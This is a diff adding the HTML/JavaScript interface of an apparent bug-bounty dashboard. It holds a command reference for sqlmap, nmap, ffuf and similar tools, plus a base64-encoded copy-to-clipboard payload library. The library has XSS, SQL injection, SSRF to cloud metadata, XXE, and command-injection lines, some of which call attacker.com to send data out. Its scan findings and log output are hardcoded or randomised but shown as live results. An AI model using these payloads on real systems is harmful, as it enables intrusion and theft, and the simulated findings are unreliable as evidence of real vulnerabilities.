+      <div class="sc sc-m"><div class="sc-ico">⚡</div><div class="sc-n" id="s-m">0</div><div class="sc-lb">Medium</div></div>
+      <div class="sc sc-l"><div class="sc-ico">ℹ️</div><div class="sc-n" id="s-l">0</div><div class="sc-lb">Low</div></div>
+      <div class="sc sc-i"><div class="sc-ico">📊</div><div class="sc-n" id="s-i">0</div><div class="sc-lb">Info</div></div>
+    </div>
+    <div class="prog" id="prog">
+      <div class="prog-top">
+        <div class="prog-l"><div class="spin" id="spin"></div><span class="prog-lbl" id="prog-lbl">INITIALIZING</span></div>
+        <div class="prog-pct" id="prog-pct">0%</div>
+      </div>
+      <div class="prog-track"><div class="prog-fill" id="prog-fill"></div></div>
+      <div class="steps" id="steps"></div>
+    </div>
+    <div class="term">
+      <div class="term-bar">
+        <div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div>
+        <span class="term-ttl">adiseclab@hunter ~ — Live Output</span>
+        <div class="term-acts">
+          <button class="tbtn" id="clear-term">Clear</button>
+          <button class="tbtn" id="scroll-bot">↓ End</button>
+        </div>
+      </div>
+      <div class="term-body" id="term-body"></div>
+    </div>
+  </div>
+
+  <!-- MODULES -->
+  <div class="page" id="page-modules">
+    <div class="pg-h"><div class="pg-t">🔧 Scan Modules</div><div class="pg-s">Toggle attack modules. Red = critical severity risk.</div></div>
+    <div class="card">
+      <div class="c-head">
+        <div class="c-title">⚙ Module Control</div>
+        <div style="display:flex;gap:7px">
+          <button class="btn b-gh b-sm" id="ena-all">Enable All</button>
+          <button class="btn b-gh b-sm" id="dis-all">Disable All</button>
+        </div>
+      </div>
+      <div class="c-body"><div class="mod-grid" id="mod-grid"></div></div>
+    </div>
+  </div>
+
+  <!-- FINDINGS -->
+  <div class="page" id="page-findings">
+    <div class="pg-h"><div class="pg-t">🎯 Vulnerability Findings</div><div class="pg-s">All discovered vulnerabilities sorted by severity.</div></div>
+    <div class="card">
+      <div class="c-head">
+        <div class="c-title">🎯 Report</div>
+        <span class="chip ch-re" id="find-chip">0 Findings</span>
+      </div>
+      <div id="findings-area">
+        <div class="empty"><div class="ei">🔍</div><p>No findings yet — run a scan.</p></div>
+      </div>
+      <div class="xbar" id="xbar" style="display:none">
+        <button class="btn b-pdf b-sm" id="xbar-pdf">📄 PDF Report</button>
+        <button class="btn b-cy b-sm" id="xbar-json">⬇ JSON</button>
+        <button class="btn b-gh b-sm" id="xbar-csv">📊 CSV</button>
+        <button class="btn b-gh b-sm" id="xbar-copy">📋 Copy</button>
+        <button class="btn b-gh b-sm" id="xbar-detail">🔬 Detail View</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- COMMANDS -->
+  <div class="page" id="page-commands">
+    <div class="pg-h"><div class="pg-t">💻 Command Reference</div><div class="pg-s">Production-ready terminal commands for every phase of bug bounty hunting.</div></div>
+    <div class="g2" id="cmd-grid"></div>
+  </div>
+
+  <!-- PAYLOADS -->
+  <div class="page" id="page-payloads">
+    <div class="pg-h"><div class="pg-t">💣 Payload Library</div><div class="pg-s">Click any payload to instantly copy to clipboard.</div></div>
+    <div id="payload-grid"></div>
+  </div>
+
+  <!-- TOOLS -->
+  <div class="page" id="page-tools">
+    <div class="pg-h"><div class="pg-t">🛠️ Tool Arsenal</div><div class="pg-s">35+ battle-tested open-source tools.</div></div>
+    <div class="card">
+      <div class="c-head"><div class="c-title">🛠 Arsenal</div><span class="chip ch-cy">35 Tools</span></div>
+      <div class="c-body"><div class="tool-grid" id="tool-grid"></div></div>
+    </div>
+  </div>
+
+  <!-- NOTES -->
+  <div class="page" id="page-notes">
+    <div class="pg-h"><div class="pg-t">📝 Hunter's Notebook</div><div class="pg-s">Session notes — scope, creds, recon, ideas.</div></div>
+    <div class="g2">
+      <div style="display:flex;flex-direction:column;gap:13px">
+        <div class="card">
+          <div class="c-head"><div class="c-title">🎯 Target Scope</div><button class="btn b-gh b-xs note-clr" data-note="scope">Clear</button></div>
+          <div class="c-body"><textarea class="note-ta" id="note-scope" rows="7" placeholder="In scope:&#10;*.target.com&#10;&#10;Out of scope:&#10;payments.target.com"></textarea></div>
+        </div>
+        <div class="card">
+          <div class="c-head"><div class="c-title">🔑 Credentials Found</div><button class="btn b-gh b-xs note-clr" data-note="creds">Clear</button></div>
+          <div class="c-body"><textarea class="note-ta" id="note-creds" rows="5" placeholder="admin:password123&#10;api_key: sk-xxxx&#10;JWT: eyJhbGc..."></textarea></div>
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:13px">
+        <div class="card">
+          <div class="c-head"><div class="c-title">📋 Recon Notes</div><button class="btn b-gh b-xs note-clr" data-note="recon">Clear</button></div>
+          <div class="c-body"><textarea class="note-ta" id="note-recon" rows="9" placeholder="/api/v2/admin — no auth&#10;/backup.zip — exposed&#10;Stack: Nginx, Node 18, PostgreSQL"></textarea></div>
+        </div>
+        <div class="card">
+          <div class="c-head"><div class="c-title">💡 Ideas &amp; Next Steps</div><button class="btn b-gh b-xs note-clr" data-note="ideas">Clear</button></div>
+          <div class="c-body"><textarea class="note-ta" id="note-ideas" rows="6" placeholder="[ ] IDOR on /api/user/{id}&#10;[ ] Weak JWT signing&#10;[ ] File upload at /upload"></textarea></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CONFIG -->
+  <div class="page" id="page-config">
+    <div class="pg-h"><div class="pg-t">⚙️ Configuration</div><div class="pg-s">Fine-tune scanner behavior.</div></div>
+    <div class="g2">
+      <div class="card">
+        <div class="c-head"><div class="c-title">⚙ Settings</div></div>
+        <div class="c-body">
+          <div class="cfg-grid">
+            <div class="cfg-f"><label class="cfg-lb">Threads</label><select class="cfg-sl" id="c-threads"><option>10</option><option>25</option><option selected>50</option><option>100</option><option>200</option></select></div>
+            <div class="cfg-f"><label class="cfg-lb">Timeout (s)</label><input type="number" class="cfg-in" id="c-timeout" value="10"></div>
+            <div class="cfg-f"><label class="cfg-lb">Rate (req/s)</label><input type="number" class="cfg-in" id="c-rate" value="150"></div>
+            <div class="cfg-f"><label class="cfg-lb">Crawl Depth</label><select class="cfg-sl" id="c-depth"><option>1</option><option selected>3</option><option>5</option><option>10</option></select></div>
+            <div class="cfg-f"><label class="cfg-lb">Severity</label><select class="cfg-sl" id="c-sev"><option>All</option><option>Critical+High</option><option>Critical Only</option></select></div>
+            <div class="cfg-f"><label class="cfg-lb">Wordlist</label><select class="cfg-sl" id="c-wl"><option>SecLists/raft-large</option><option>SecLists/raft-medium</option><option>dirbuster-medium</option></select></div>
+            <div class="cfg-f" style="grid-column:1/-1"><label class="cfg-lb">HTTP Proxy</label><input type="text" class="cfg-in" id="c-proxy" placeholder="http://127.0.0.1:8080"></div>
+          </div>
+          <div style="margin-top:14px;display:flex;gap:8px">
+            <button class="btn b-cy b-sm" id="save-cfg">💾 Save</button>
+            <button class="btn b-gh b-sm" id="reset-cfg">↺ Reset</button>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="c-head"><div class="c-title">📊 Active Config</div></div>
+        <div class="c-body">
+          <table class="itbl">
+            <tr><td>THREADS</td><td id="cs-thr">50</td></tr>
+            <tr><td>TIMEOUT</td><td id="cs-to">10s</td></tr>
+            <tr><td>RATE</td><td id="cs-rt">150 req/s</td></tr>
+            <tr><td>DEPTH</td><td id="cs-dp">3</td></tr>
+            <tr><td>SEVERITY</td><td id="cs-sv">All</td></tr>
+            <tr><td>WORDLIST</td><td id="cs-wl">raft-large</td></tr>
+            <tr><td>PROXY</td><td id="cs-px">None</td></tr>
+            <tr><td>MODE</td><td id="cs-md">Recon</td></tr>
+            <tr><td>MODULES</td><td id="cs-mo">—</td></tr>
+            <tr><td>DEVELOPER</td><td style="color:var(--cy)">Aditya Bhosale</td></tr>
+            <tr><td>VERSION</td><td style="color:var(--gr)">v5.0.0</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ABOUT -->
+  <div class="page" id="page-about">
+    <div class="pg-h"><div class="pg-t">👤 About Developer</div><div class="pg-s">Meet the mind behind AdiSecLab.</div></div>
+    <div class="ab-hero">
+      <div class="ab-lay">
+        <div class="ab-av-w"><div class="ab-av">AB</div><div class="ab-onl"><div class="dot"></div>Available</div></div>
+        <div>
+          <div class="ab-nm">Aditya Bhosale</div>
+          <div class="ab-tt">Security Researcher · Bug Bounty Hunter · Penetration Tester</div>
+          <div class="ab-bio">Passionate cybersecurity professional specializing in web application security and offensive research. Creator of AdiSecLab — integrating 30+ open-source tools into an elite recon and exploitation platform.</div>
+          <div class="ab-lnks">
+            <a class="ab-ln al-li" href="https://www.linkedin.com/in/bhsoaleaditya/" target="_blank">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+              LinkedIn
+            </a>
+            <a class="ab-ln al-em" href="mailto:adityabhosale212223@gmail.com">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+              adityabhosale212223@gmail.com
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="ab-stats">
+      <div class="ast"><div class="ast-n">30+</div><div class="ast-l">Modules</div></div>
+      <div class="ast"><div class="ast-n">8k+</div><div class="ast-l">Nuclei Templates</div></div>
+      <div class="ast"><div class="ast-n">35+</div><div class="ast-l">Tools</div></div>
+      <div class="ast"><div class="ast-n">100%</div><div class="ast-l">Open Source</div></div>
+    </div>
+    <div class="g2" style="margin-bottom:14px">
+      <div class="card"><div class="c-head"><div class="c-title">🎯 Core Skills</div></div><div class="c-body" id="sk-grid"></div></div>
+      <div class="card">
+        <div class="c-head"><div class="c-title">📬 Contact</div></div>
+        <div class="c-body" style="display:flex;flex-direction:column;gap:10px">
+          <div style="display:flex;align-items:center;gap:10px;padding:12px;background:var(--s2);border-radius:var(--r1);border:1px solid var(--b1)">
+            <span style="font-size:18px">📧</span>
+            <div><div style="font-family:var(--mono);font-size:9px;color:var(--t3);letter-spacing:1px;margin-bottom:2px">EMAIL</div><a href="mailto:adityabhosale212223@gmail.com" style="color:var(--cy);font-size:13px;font-weight:500">adityabhosale212223@gmail.com</a></div>
+          </div>
+          <div style="display:flex;align-items:center;gap:10px;padding:12px;background:var(--s2);border-radius:var(--r1);border:1px solid var(--b1)">
+            <span style="font-size:18px">💼</span>
+            <div><div style="font-family:var(--mono);font-size:9px;color:var(--t3);letter-spacing:1px;margin-bottom:2px">LINKEDIN</div><a href="https://www.linkedin.com/in/bhsoaleaditya/" target="_blank" style="color:#3a9fd8;font-size:13px;font-weight:500">linkedin.com/in/bhsoaleaditya</a></div>
+          </div>
+          <p style="font-size:13px;color:var(--t2);line-height:1.7">Open to collaboration, responsible disclosure, freelance pentesting. Response within 24–48 hours.</p>
+          <a href="mailto:adityabhosale212223@gmail.com" class="btn b-cy b-sm" style="align-self:flex-start">✉️ Send Message</a>
+        </div>
+      </div>
+    </div>
+    <div class="card"><div class="c-head"><div class="c-title">🛠 Technologies Used</div></div><div class="c-body"><div id="tp-grid"></div><p class="hint">All tools are open-source. For authorized security testing only.</p></div></div>
+  </div>
+</div><!-- /main -->
+</div><!-- /wrap -->
+
+<!-- DETAIL MODAL -->
+<div class="modal" id="detail-modal">
+  <div class="modal-in">
+    <div class="card">
+      <div class="c-head"><div class="c-title">🔬 Detailed Analysis</div><button class="btn b-gh b-sm" id="close-modal">✕ Close</button></div>
+      <div class="c-body" id="detail-body"></div>
+    </div>
+  </div>
+</div>
+<div id="notifs"></div>
+
+<script>
+(function(){
+'use strict';
+
+/* ═══ DATA ═══ */
+var MODS=[
+  {id:'sub', nm:'Subfinder/Amass',   ic:'🔍',ds:'Passive+active subdomain enum',          on:true},
+  {id:'hx',  nm:'HTTPX Prober',      ic:'🌐',ds:'Live host probing + tech detection',      on:true},
+  {id:'nm',  nm:'Nmap / RustScan',   ic:'📡',ds:'Full port scan + service detection',      on:true},
+  {id:'nuc', nm:'Nuclei',            ic:'⚛️',ds:'8000+ templates: CVEs, misconfigs',       on:true,cr:true},
+  {id:'sql', nm:'SQLMap',            ic:'💉',ds:'SQL injection detection + exploit',        on:true,cr:true},
+  {id:'xss', nm:'DalFox',            ic:'🕷️',ds:'DOM + reflected + stored XSS',            on:true,cr:true},
+  {id:'lfi', nm:'LFI / Traversal',  ic:'📂',ds:'Path traversal & LFI detection',          on:true,cr:true},
+  {id:'srf', nm:'SSRF Scanner',      ic:'🔄',ds:'SSRF + AWS metadata leakage',             on:true,cr:true},
+  {id:'xxe', nm:'XXE Injector',      ic:'📄',ds:'XML External Entity injection',           on:false,cr:true},
+  {id:'sti', nm:'SSTI Scanner',      ic:'🧩',ds:'Template injection — RCE risk',           on:false,cr:true},
+  {id:'cor', nm:'CORS Scanner',      ic:'🔀',ds:'CORS misconfiguration checks',            on:true},
+  {id:'hdr', nm:'Security Headers',  ic:'📋',ds:'Missing/weak HTTP security headers',      on:true},
+  {id:'fuf', nm:'FFUF / Gobuster',   ic:'🗂️',ds:'Directory & file fuzzing',               on:true},
+  {id:'par', nm:'ParamSpider',       ic:'🦆',ds:'Parameter mining from archives',          on:true},
+  {id:'tak', nm:'Sub Takeover',      ic:'🏴',ds:'Subjack + Subzy checks',                  on:true,cr:true},
+  {id:'sec', nm:'Secret Hunter',     ic:'🔑',ds:'Leaked secrets in code & JS files',       on:true,cr:true},
+  {id:'wb',  nm:'Wayback Machine',   ic:'⏮️',ds:'Mine old endpoints from archive',         on:true},
+  {id:'js',  nm:'JS Analyzer',       ic:'📜',ds:'Extract endpoints from JavaScript',       on:true},
+  {id:'waf', nm:'WAF Detector',      ic:'🧱',ds:'Fingerprint WAF for bypass planning',     on:true},
+  {id:'red', nm:'Open Redirect',     ic:'↪️',ds:'Open redirect scanner',                  on:true},
+  {id:'api', nm:'API Fuzzer',        ic:'📡',ds:'REST/SOAP API security testing',          on:true},
+  {id:'ssl', nm:'SSL/TLS Scanner',   ic:'🔒',ds:'Weak ciphers, BEAST, POODLE',            on:true},
+  {id:'cms', nm:'CMS Scanner',       ic:'🖥️',ds:'WordPress/Joomla/Drupal vulns',          on:true},
+  {id:'403', nm:'403 Bypass',        ic:'🚧',ds:'Bypass Forbidden responses',             on:true},
+];
+
+var TOOLS=[
+  {n:'Subfinder',d:'Subdomain enum via passive sources',c:'RECON'},
+  {n:'Amass',d:'Active + passive attack surface mapping',c:'RECON'},
+  {n:'HTTPX',d:'HTTP toolkit + tech detection',c:'RECON'},
+  {n:'DNSX',d:'DNS resolution + brute-force',c:'RECON'},
+  {n:'Nmap',d:'Network port scanner + service detection',c:'PORTSCAN'},
+  {n:'RustScan',d:'Ultra-fast port scanner',c:'PORTSCAN'},
+  {n:'Masscan',d:'Mass port scanner',c:'PORTSCAN'},
+  {n:'Nuclei',d:'Template-based vuln scanner (8k+ templates)',c:'VULN'},
+  {n:'Nikto',d:'Web server misconfiguration scanner',c:'VULN'},
+  {n:'SQLMap',d:'Automated SQLi detection + exploitation',c:'EXPLOIT'},
+  {n:'Ghauri',d:'Advanced SQL injection tool',c:'EXPLOIT'},
+  {n:'DalFox',d:'XSS scanner — DOM/reflected/stored',c:'XSS'},
+  {n:'KXSS',d:'Reflected parameter finder for XSS',c:'XSS'},
+  {n:'FFUF',d:'Fast web fuzzer for dirs, files, params',c:'FUZZING'},
+  {n:'Gobuster',d:'Dir/DNS/VHost brute-force',c:'FUZZING'},
+  {n:'Feroxbuster',d:'Recursive content discovery',c:'FUZZING'},
+  {n:'WFuzz',d:'Web application fuzzer',c:'FUZZING'},
+  {n:'ParamSpider',d:'Parameter mining from archives',c:'RECON'},
+  {n:'Arjun',d:'HTTP hidden parameter discovery',c:'RECON'},
+  {n:'Katana',d:'Next-gen web crawler with JS parsing',c:'CRAWL'},
+  {n:'Hakrawler',d:'Fast endpoint crawler',c:'CRAWL'},
+  {n:'Gau',d:'URLs from AlienVault/Wayback/CommonCrawl',c:'RECON'},
+  {n:'Waybackurls',d:'URLs from Wayback Machine',c:'RECON'},
+  {n:'LinkFinder',d:'Endpoints inside JavaScript files',c:'JS'},
+  {n:'SecretFinder',d:'API keys/tokens in JS files',c:'SECRETS'},
+  {n:'TruffleHog',d:'Secrets in Git repositories',c:'SECRETS'},
+  {n:'GitLeaks',d:'Hardcoded credentials in git history',c:'SECRETS'},
+  {n:'Subjack',d:'Subdomain takeover detection',c:'TAKEOVER'},
+  {n:'Subzy',d:'Fast subdomain takeover checker',c:'TAKEOVER'},
+  {n:'SSRFMap',d:'SSRF detection + exploitation',c:'SSRF'},
+  {n:'S3Scanner',d:'Open/misconfigured S3 buckets',c:'CLOUD'},
+  {n:'TestSSL.sh',d:'TLS/SSL vulnerability testing',c:'TLS'},
+  {n:'WPScan',d:'WordPress security scanner',c:'CMS'},
+  {n:'Cloudflair',d:'Find real IP behind Cloudflare',c:'RECON'},
+  {n:'Masscan',d:'Mass port scanner for full range',c:'PORTSCAN'},
+];
+
+var CMDS=[
+  {cat:'🔍 Recon',txt:'# Subdomain enum\n$ subfinder -d target.com -o subs.txt -silent\n\n# Passive OSINT\n$ amass enum -passive -d target.com -o amass.txt\n\n# Probe live hosts\n$ httpx -l subs.txt -silent -status-code -title -tech-detect\n\n# DNS resolution\n$ dnsx -l subs.txt -a -cname -silent'},
+  {cat:'📡 Port Scan',txt:'# Full port + scripts\n$ nmap -sV -sC -p- --open -T4 -oN nmap.txt target.com\n\n# Fast RustScan\n$ rustscan -a target.com --ulimit 5000 -- -sV -sC\n\n# Mass scan\n$ masscan -p1-65535 target.com --rate 10000'},
+  {cat:'⚛️ Nuclei',txt:'# Critical/High CVEs\n$ nuclei -l live.txt -t nuclei-templates/ -severity critical,high\n\n# CVE + exposure focused\n$ nuclei -u https://target.com -t cves/ exposures/ -es info\n\n# Classic web scanner\n$ nikto -h https://target.com -output nikto.html'},
+  {cat:'💉 SQL Injection',txt:'# Auto SQLi + dump DBs\n$ sqlmap -u "URL?id=1" --level=5 --risk=3 --dbs --batch\n\n# Burp request + WAF bypass\n$ sqlmap -r request.txt --tamper=space2comment --os-shell\n\n# Modern SQLi tool\n$ ghauri -u "URL?id=1" --dbs --level=3'},
+  {cat:'🕷️ XSS Hunting',txt:'# DalFox DOM XSS\n$ dalfox url "URL?q=test" --deep-domxss -o xss.txt\n\n# Crawl + XSS pipeline\n$ katana -u https://target.com -jc | dalfox pipe\n\n# Reflected params\n$ kxss < urls.txt'},
+  {cat:'🗂️ Fuzzing',txt:'# FFUF directory scan\n$ ffuf -u https://target.com/FUZZ -w raft-large-words.txt -mc 200,301,302,403\n\n# Gobuster with extensions\n$ gobuster dir -u https://target.com -w directory-list-2.3-medium.txt -x php,html,txt'},
+  {cat:'🔄 SSRF / LFI',txt:'# SSRF auto-exploit\n$ ssrfmap -r request.txt -p url -m readfiles,portscan\n\n# SSRF via Nuclei\n$ nuclei -u https://target.com -t vulnerabilities/ssrf/\n\n# Path traversal\n$ dotdotpwn -m http -h target.com -d 8 -f /etc/passwd'},
+  {cat:'🔑 Secrets',txt:'# GitHub org scan\n$ trufflehog github --org target-org --only-verified\n\n# Git history scan\n$ gitleaks detect -r https://github.com/target/repo -v\n\n# Secrets in JS files\n$ secretfinder -i https://target.com/app.js -o cli'},
+  {cat:'🏴 Subdomain Takeover',txt:'# Subjack check\n$ subjack -w subs.txt -t 100 -o takeover.txt -ssl\n\n# Subzy fast checker\n$ subzy run --targets subs.txt --concurrency 100\n\n# Nuclei templates\n$ nuclei -l subs.txt -t takeovers/'},
+  {cat:'☁️ Cloud & TLS',txt:'# Open S3 buckets\n$ S3Scanner scan --buckets-file buckets.txt\n\n# Full TLS audit\n$ testssl.sh --full --html report.html https://target.com\n\n# Real IP behind CF\n$ cloudflair -d target.com'},
+];
+
+// Payloads: base64 JSON — HTML parser never sees raw tags
+var _PL='eyJYU1MiOlsiPHNjcmlwdD5hbGVydCgnWFNTJyk8XC9zY3JpcHQ+IiwiPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+IiwiXCI+PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+IiwiamF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUpIiwiPGJvZHkgb25sb2FkPWFsZXJ0KDEpPiIsIjxpbnB1dCBvbmZvY3VzPWFsZXJ0KDEpIGF1dG9mb2N1cz4iLCJ7ezc9N319IiwiJHs3Kjd9IiwiPGRldGFpbHMvb3Blbi9vbnRvZ2dsZT1hbGVydCgxKT4iXSwiU1FMIjpbIicgT1IgJzEnPScxIiwiJyBPUiAxPTEgLS0iLCInOyBEUk9QIFRBQkxFIHVzZXJzOyAtLSIsIicgVU5JT04gU0VMRUNUIG51bGwsbnVsbCxudWxsIC0tIiwiYWRtaW4nLS0iLCIxJyBPUkRFUiBCWSAxLS0rIiwiMScgQU5EIHNsZWVwKDUpLS0iLCInOyBFWEVDIHhwX2NtZHNoZWxsKCd3aG9hbWknKS0tIiwiJyBBTkQgRVhUUkFDVFZBTFVFKDEsQ09OQ0FUKDEsdmVyc2lvbigpKSktLSIsIjEgQU5EIChTRUxFQ1QgKiBGUk9NKFNFTEVDVChTTEVFUCg1KSkpYSkiXSwiU1NSRi9MRkkiOlsiaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLyIsImh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMvIiwiaHR0cDovL2xvY2FsaG9zdDo2Mzc5LyIsImZpbGU6Ly8vZXRjL3Bhc3N3ZCIsImZpbGU6Ly8vZXRjL3NoYWRvdyIsIi4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiLCIuLi8uLi8uLi93aW5kb3dzL3dpbi5pbmkiLCIlMmUlMmUlMmYlMmUlMmUlMmZldGMlMmZwYXNzd2QiLCJodHRwOi8vWzo6XTo4MC8iLCJkaWN0Oi8vbG9jYWxob3N0OjExMjExL3N0YXRzIl0sIkF1dGggQnlwYXNzIjpbIntcInJvbGVcIjpcImFkbWluXCJ9IiwiQXV0aG9yaXphdGlvbjogQmVhcmVyIG51bGwiLCJYLUZvcndhcmRlZC1Gb3I6IDEyNy4wLjAuMSIsIlgtT3JpZ2luYWwtVVJMOiAvYWRtaW4iLCJYLVJld3JpdGUtVVJMOiAvYWRtaW4iLCI/YWRtaW49dHJ1ZSIsIj9kZWJ1Zz0xIiwiP3JvbGU9c3VwZXJhZG1pbiIsIkNvb2tpZTogaXNBZG1pbj10cnVlIiwie1widXNlcmlkXCI6XCIxIE9SIDE9MVwifSJdLCJDbWQgSW5qZWN0aW9uIjpbIjsgd2hvYW1pIiwifCB3aG9hbWkiLCImJiB3aG9hbWkiLCIkKHdob2FtaSkiLCI7IHBpbmcgLWMgMTAgMTI3LjAuMC4xIiwiJTBhIHdob2FtaSIsInx8IGNhdCAvZXRjL3Bhc3N3ZCIsIjsgY3VybCBodHRwOi8vYXR0YWNrZXIuY29tLyQod2hvYW1pKSJdLCJYWEUiOlsiPD94bWwgdmVyc2lvbj1cIjEuMFwiPz48IURPQ1RZUEUgZm9vIFs8IUVOVElUWSB4eGUgU1lTVEVNIFwiZmlsZTovLy9ldGMvcGFzc3dkXCI+XT48Zm9vPiZ4eGU7PC9mb28+IiwiPD94bWwgdmVyc2lvbj1cIjEuMFwiPz48IURPQ1RZUEUgZm9vIFs8IUVOVElUWSB4eGUgU1lTVEVNIFwiaHR0cDovL2F0dGFja2VyLmNvbS9cIj5dPjxmb28+Jnh4ZTs8L2Zvbz4iLCI8IURPQ1RZUEUgdGVzdCBbPCFFTlRJVFkgJSB4eGUgU1lTVEVNIFwiaHR0cDovL2F0dGFja2VyLmNvbS9ldmlsLmR0ZFwiPiAleHhlO10+Il0sIk9wZW4gUmVkaXJlY3QiOlsiLy9ldmlsLmNvbSIsImh0dHBzOi8vZXZpbC5jb20iLCIvXFxldmlsLmNvbSIsIiUyRiUyRmV2aWwuY29tIiwiLyUwOS9ldmlsLmNvbSIsIj91cmw9Ly9nb29nbGUuY29tQGV2aWwuY29tIl19';
+var PAYLOADS={};try{PAYLOADS=JSON.parse(atob(_PL));}catch(e){}
+
+var FINDINGS=[
+  {sv:'critical',nm:'SQL Injection (Error-Based)',     url:'/api/users?id=1',   tl:'SQLMap',      ds:'Parameter "id" injectable via error-based. MySQL 8.0 confirmed. Full DB enumeration possible.'},
+  {sv:'critical',nm:'SSTI — Remote Code Execution',   url:'/search?q=test',    tl:'Nuclei',      ds:'Jinja2 template injection. RCE via expression. Immediate patch required.'},
+  {sv:'critical',nm:'Subdomain Takeover',             url:'dev.target.com',    tl:'Subzy',       ds:'CNAME → unclaimed S3 bucket. Full subdomain takeover possible.'},
+  {sv:'high',    nm:'Reflected XSS — Search Param',   url:'/search?query=',    tl:'DalFox',      ds:'Param "query" reflects unsanitized input. No CSP. Session hijack risk.'},
+  {sv:'high',    nm:'SSRF via URL Parameter',         url:'/fetch?url=',       tl:'SSRFMap',     ds:'AWS IMDSv1 reachable at 169.254.169.254. Credentials exposure risk.'},
+  {sv:'high',    nm:'Exposed Admin Panel',            url:'/admin/dashboard',  tl:'Nuclei',      ds:'Django admin exposed without IP restriction or rate limiting.'},
+  {sv:'high',    nm:'AWS Keys Leaked in JS Bundle',   url:'/static/app.js',    tl:'SecretFinder',ds:'AWS_ACCESS_KEY_ID + SECRET_ACCESS_KEY hardcoded in bundled JavaScript.'},
+  {sv:'medium',  nm:'CORS Misconfiguration',          url:'/api/profile',      tl:'Nuclei',      ds:'Origin reflection with credentials. Any origin can read authenticated responses.'},
+  {sv:'medium',  nm:'Missing Security Headers',       url:'/',                 tl:'HTTPX',       ds:'X-Frame-Options, HSTS, CSP, X-Content-Type-Options all absent.'},
+  {sv:'medium',  nm:'Directory Listing Enabled',      url:'/uploads/',         tl:'FFUF',        ds:'Apache directory listing exposes uploaded files and SQL backup archives.'},
+  {sv:'medium',  nm:'Weak TLS Configuration',         url:'target.com:443',    tl:'TestSSL',     ds:'TLSv1.0 enabled. RC4+DES cipher suites present. Upgrade to TLSv1.3 only.'},
+  {sv:'low',     nm:'HTTP TRACE Method Enabled',      url:'/',                 tl:'Nmap',        ds:'TRACE enabled — XST attack vector. PUT method may allow file upload.'},
+  {sv:'low',     nm:'Server Version Disclosure',      url:'/',                 tl:'Nikto',       ds:'Apache/2.4.49 in headers. CVE-2021-41773 path traversal known for this version.'},
+  {sv:'info',    nm:'253 Subdomains Discovered',      url:'*.target.com',      tl:'Subfinder',   ds:'253 live subdomains found. 12 with interesting tech stacks identified.'},
+  {sv:'info',    nm:'Open Ports Discovered',          url:'target.com',        tl:'Nmap',        ds:'Open: 22/SSH, 80/HTTP, 443/HTTPS, 3306/MySQL (exposed!), 8080, 8443.'},
+];
+
+var STEPS=['DNS','PORTSCAN','WAYBACK','HTTPX','CRAWL','JS','PARAMS','NUCLEI','SQLI','XSS','SSRF','SECRETS','TAKEOVER','HEADERS','REPORT'];
+
+var LOG_LINES=function(t){return[
+  ['sys','<span class="v">AdiSecLab v5.0</span> by <span class="h">Aditya Bhosale</span> — engine ready'],
+  ['inf','Target: <span class="h">'+t+'</span> — resolving DNS...'],
+  ['ok', 'DNS resolved → <span class="g">104.21.'+rn(1,250)+'.'+rn(1,250)+'</span> | ASN: AS'+rn(10000,60000)],
+  ['inf','<span class="h">Subfinder</span> + <span class="h">Amass</span> — passive subdomain enum...'],
+  ['ok', '<span class="g">'+rn(80,250)+'</span> subdomains via CertSpotter, VirusTotal, Shodan'],
+  ['inf','<span class="h">HTTPX</span> probing live hosts — tech detection...'],
+  ['ok', '<span class="g">'+rn(40,120)+'</span> live. Stack: <span class="y">Nginx, React 18, Node.js, PostgreSQL</span>'],
+  ['inf','<span class="h">RustScan</span> — full port range 1-65535...'],
+  ['w',  '\u26a0 Port <span class="r">3306 MySQL</span> exposed to internet!'],
+  ['ok', 'Open: <span class="g">22, 80, 443, 3306, 8080, 8443</span>'],
+  ['inf','<span class="h">Katana</span> crawling — depth 5, JS rendering...'],
+  ['ok', '<span class="g">'+rn(300,800)+'</span> URLs. <span class="y">'+rn(10,30)+'</span> API endpoints found'],
+  ['inf','<span class="h">Nuclei</span> — 8,247 templates loading...'],
+  ['cr', '\uD83D\uDD25 CRITICAL: <span class="r">SQL Injection</span> at <span class="h">/api/users?id=1</span>'],
+  ['cr', '\uD83D\uDD25 CRITICAL: <span class="r">SSTI (Jinja2)</span> at <span class="h">/search?q=</span> — RCE CONFIRMED'],
+  ['cr', '\uD83D\uDD25 CRITICAL: <span class="r">Subdomain Takeover</span> dev.* → unclaimed S3'],
+  ['inf','<span class="h">DalFox</span> fuzzing <span class="g">'+rn(30,80)+'</span> params for XSS...'],
+  ['w',  '\u26a0 HIGH: <span class="y">Reflected XSS</span> in /search?query='],
